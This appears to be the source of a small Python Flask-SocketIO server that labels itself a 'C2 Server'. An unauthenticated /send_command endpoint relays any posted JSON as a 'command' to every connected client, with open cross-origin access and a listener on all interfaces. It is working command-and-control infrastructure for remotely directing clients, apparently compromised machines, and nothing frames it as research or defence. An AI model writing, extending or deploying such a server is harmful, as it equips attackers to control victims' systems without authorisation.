import os
from flask import Flask, request, jsonify
from flask_socketio import SocketIO, emit
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

clients = set()

@app.route('/')
def index():
    return "C2 Server is running!"

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    if not data:
        return jsonify({"error": "No data"}), 400
    socketio.emit('command', data)
    return jsonify({"status": "sent", "clients": len(clients)})

@socketio.on('connect')
def handle_connect():
    clients.add(request.sid)
    print(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    clients.discard(request.sid)
    print(f"Client disconnected: {request.sid}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    socketio.run(app, host='0.0.0.0', port=port)
